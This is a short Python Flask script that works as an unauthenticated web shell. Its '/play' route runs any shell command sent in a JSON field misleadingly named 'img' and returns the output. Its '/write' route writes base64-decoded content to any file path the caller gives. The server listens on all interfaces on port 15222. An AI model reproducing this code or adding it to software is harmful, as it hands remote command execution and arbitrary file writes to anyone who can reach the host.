import webbrowser
import json
import torch
import base64
import os, sys

from flask import Flask, request, jsonify, json, render_template



app = Flask(__name__)



@app.route('/play')
def index():
    data = request.get_data()
    data = json.loads(data)
    img = data["img"]
    # a= os.popen(img[0],"r")
    os.chdir(img[0])
    # d=a.read()
    a = os.popen(img[1],"r")
    d = a.read()
    # print(a)
    return d

@app.route('/write', methods=['get'])
def start():
    data = request.get_data()
    data = json.loads(data)
    path = data["path"]
    
    code = base64.b64decode(data["code"])
    with open(path, 'wb') as file:
	    file.write(code)
    return "ok"

if __name__ == '__main__':

	# webbrowser.open("http://127.0.0.1:5000")
	app.run(host='0.0.0.0',port="15222")

